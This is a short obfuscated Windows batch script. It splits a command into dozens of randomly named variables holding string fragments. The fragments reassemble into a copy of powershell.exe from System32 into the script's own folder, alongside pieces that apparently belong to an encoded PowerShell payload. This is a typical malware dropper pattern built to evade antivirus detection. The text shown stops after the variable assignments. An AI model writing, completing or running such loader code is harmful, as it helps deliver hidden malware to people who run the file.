@echo off
set "UwaEOGVSlF=y "
set "MOWtXXjSxk=\v"
set "JqSnVaHdHG=we"
set "fXODSlWNMP=ll"
set "tLEcxBJnbA=we"
set "WAQkqwbXTP=ws"
set "ZBhrfZqxvr= C"
set "vKpixuYaYc=rs"
set "nhVsDTjqxf=he"
set "bKOgyyAMcd=32"
set "CXcMBgHcIw=py"
set "GFFmKwnTnC=st"
set "TgGlEiTvnv= /"
set "pCBGuskixs=s\"
set "QTfGuHgphR=Sy"
set "FKQmPVRyNm=do"
set "frUUwoePha=in"
set "jfpKWmPmyE=1."
set "AkDssyolLy=xe"
set "bnRTUbzBau=ll"
set "ljiudzReAc=:\"
set "SyCIcEAKEZ=rS"
set "rFtxLsPHIc=ow"
set "nGqjvXxPrT=.e"
set "WBOqzubwyU=em"
set "lAARwJXpVY=\W"
set "WDcSnmTlzo=nd"
set "ssPVuVKYQQ=0\"
set "cGqZUMjxsO=Wi"
set "HMXOnzlCuF=po"
set "NbDEoIdOOW=co"
set "nlcGCxhBxw=he"
set "wMBAOKPTKj=Po"
set "gKmsxLWVeM= %~dp0"
set "nKcZjWQRPJ=cd"
set "tiGfmVaWJd=F'[-"
set "fVarhrXTDK=xHQ."
set "IKuUSiKvkW=($xv"
set "SyObdULRFJ=();$"
set "wdhGLTBSwv=xvJD"
set "WvykKzeOLq=m(, "
set "DqQdQzAjnt=.Com"
set "MCsJBNqBVa=);$t"
set "ASBVMGHYBA=yste"
